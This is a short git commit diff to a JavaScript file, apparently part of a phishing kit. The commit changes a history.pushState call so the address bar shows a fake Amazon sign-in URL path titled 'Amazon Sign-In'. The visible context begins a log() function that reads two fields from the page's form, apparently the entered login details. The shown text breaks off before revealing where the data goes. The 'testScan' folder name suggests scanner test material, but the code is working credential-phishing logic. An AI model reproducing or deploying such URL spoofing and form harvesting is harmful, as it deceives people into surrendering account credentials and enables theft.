b24a8e62721e471ef0c989e8781426f462bc3885
ⵟⴰⵕⵉⴽ ⴱⴰⴽⵉⵕ <41262131+TRKBKR@users.noreply.github.com>
2025-12-20 19:52:08 +0100

    Update URL in history.pushState for signin

--- testScan/a.js
+++ testScan/a.js
@@ -1,4 +1,4 @@
-history.pushState('','Amazon Sign-In', 'https://cloud.email.pharmacy.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')
+history.pushState('','Amazon Sign-In', '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2Fref%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0')
 function log() { 
  var x = document.forms[0];
  var d=[x.elements[11].value,x.elements[13].value];
